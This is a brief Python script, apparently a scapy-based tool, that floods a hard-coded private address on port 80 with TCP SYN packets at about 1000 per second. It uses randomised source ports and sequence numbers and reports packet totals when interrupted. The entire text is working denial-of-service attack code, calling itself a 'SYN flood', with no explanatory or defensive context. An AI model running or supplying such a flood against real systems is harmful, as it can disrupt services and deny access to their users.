import time
import random
from datetime import datetime
from scapy.all import IP, TCP, send

target_ip = "192.168.1.78"
target_port = 80
rate = 1000  # packets per second
flag = "S"

print("Starting SYN flood... Ctrl+C to stop")

start_time = datetime.now()
packet_count = 0

try:
    while True:
        ip = IP(dst=target_ip)
        tcp = TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags=flag,
            seq=random.randint(1000, 9000)
        )

        send(ip/tcp, verbose=False)
        packet_count += 1
        time.sleep(1.0 / rate)

except KeyboardInterrupt:
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    actual_rate = packet_count / duration if duration > 0 else 0

    print("\nAttack stopped.")
    print(f"Total packets: {packet_count}")
    print(f"Duration: {duration:.2f}s")
    print(f"Actual rate: {actual_rate:.2f} pps")
